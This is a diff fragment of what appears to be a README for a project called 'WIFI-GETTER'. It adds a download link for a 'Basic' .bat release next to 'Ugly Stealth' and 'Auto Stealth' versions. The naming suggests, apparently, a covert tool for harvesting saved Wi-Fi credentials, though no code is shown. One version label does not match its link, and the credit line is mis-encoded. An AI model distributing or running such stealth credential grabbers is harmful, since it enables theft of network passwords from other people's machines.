@@ -17,7 +17,7 @@ Im thanking ┬úunL╦å for great help in programming the most.
 
    Art          | Version   | Link
 ----------------|-----------|-----------------
-Basic           | Developer | [Coming]()
+Basic           | Developer | [Holen](https://github.com/Minz16/WIFI-GETTER/releases/download/basic/WIFI-GETTER.bat)
 Ugly Stealth ONS| v.3.1.1   | [Holen](https://github.com/Minz16/WIFI-GETTER/releases/download/v.3.2.0/WIFI-GETTER.bat)
 Ugly Stealth    | v.3.1.0   | [Holen](https://github.com/Minz16/WIFI-GETTER/releases/download/v.3.1.0/WIFI-GETTER.bat)
 Auto Stealth    | v.3.0.0   | [Holen](https://github.com/Minz16/WIFI-GETTER/releases/download/v.3.0.0/WIFI-GETTER.bat)
